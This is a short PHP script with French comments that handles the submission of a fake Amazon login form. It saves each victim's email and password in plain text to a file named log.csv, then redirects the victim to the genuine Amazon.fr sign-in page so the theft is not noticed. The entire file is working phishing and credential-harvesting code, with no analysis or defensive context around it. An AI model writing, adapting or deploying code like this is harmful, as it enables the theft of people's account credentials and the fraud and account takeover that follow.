<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données soumises
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Nettoyer les données pour éviter les failles XSS
    $email_clean = htmlspecialchars($email);
    $password_clean = htmlspecialchars($password);

    // Spécifier le fichier CSV
    $file = 'log.csv';

    // Ouvrir le fichier CSV en mode ajout (append)
    $handle = fopen($file, 'a');

    // Créer une ligne avec l'email et le mot de passe
    $data = array($email_clean, $password_clean);

    // Écrire les données dans le fichier CSV
    fputcsv($handle, $data);

    // Fermer le fichier
    fclose($handle);

    // Rediriger vers le site officiel d'Amazon
    header("Location: https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2Fyour-account%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0");
    exit();
}
?>
